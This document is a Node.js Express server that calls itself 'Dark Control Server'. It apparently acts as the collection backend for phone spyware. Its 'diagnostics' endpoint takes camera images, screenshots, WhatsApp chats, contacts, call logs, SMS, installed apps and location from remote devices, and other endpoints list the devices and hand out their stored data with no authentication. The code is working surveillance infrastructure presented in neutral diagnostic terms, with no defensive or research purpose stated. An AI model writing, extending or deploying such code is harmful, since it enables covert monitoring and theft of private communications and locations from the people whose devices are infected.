const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'database.json');

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(__dirname));

function readDB() {
    if (!fs.existsSync(DB_FILE)) return { devices: {}, diagnostics: {} };
    try { return JSON.parse(fs.readFileSync(DB_FILE, 'utf8')); }
    catch (e) { return { devices: {}, diagnostics: {} }; }
}

function writeDB(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

function cleanStr(str, maxLen = 512) {
    if (typeof str !== 'string') return '';
    return str.substring(0, maxLen).replace(/[<>]/g, '');
}

function cleanId(id) {
    return cleanStr(id, 64).replace(/[^a-zA-Z0-9_-]/g, '');
}

// استقبال البيانات والتشخيصات والوسائط المنفصلة
app.post("/api/diagnostics/:category", (req, res) => {
    const id = cleanId(req.body?.deviceId);
    const category = cleanStr(req.params.category, 32);
    
    const allowed = ["deviceInfo", "camera", "screenshots", "wa_messenger", "wa_business", "contacts", "calls", "messages", "apps", "location"];
    if (!id || !allowed.includes(category)) {
        return res.status(400).json({ error: "Invalid parameters" });
    }

    const db = readDB();
    db.devices = db.devices || {};
    db.diagnostics = db.diagnostics || {};
    
    // تحديث نبضة الاتصال واللوغ
    db.devices[id] = {
        model: cleanStr(req.body?.model || id),
        lastSeen: Date.now()
    };

    if (!db.diagnostics[id]) db.diagnostics[id] = {};
    
    db.diagnostics[id][category] = {
        updatedAt: Date.now(),
        count: Number(req.body?.count) || 0,
        items: req.body?.items || []
    };
    
    writeDB(db);
    res.json({ ok: true });
});

// جلب قائمة الأجهزة مع وقت الاتصال
app.get("/api/devices", (req, res) => {
    const db = readDB();
    const keys = Object.keys(db.devices || {});
    const devices = keys.map(k => ({
        id: k,
        model: db.devices[k].model || k,
        lastSeen: db.devices[k].lastSeen || 0
    }));
    res.json({ devices });
});

// جلب تفاصيل جهاز محدد
app.get("/api/diagnostics/:id", (req, res) => {
    const id = cleanId(req.params.id);
    const db = readDB();
    const diagnostics = db.diagnostics?.[id] || {};
    res.json({ diagnostics });
});

// حذف جهاز
app.delete("/api/device/:id", (req, res) => {
    const id = cleanId(req.params.id);
    const db = readDB();
    if (db.devices) delete db.devices[id];
    if (db.diagnostics) delete db.diagnostics[id];
    writeDB(db);
    res.json({ ok: true });
});

app.listen(PORT, () => {
    console.log(`Dark Control Server running on port ${PORT}`);
});
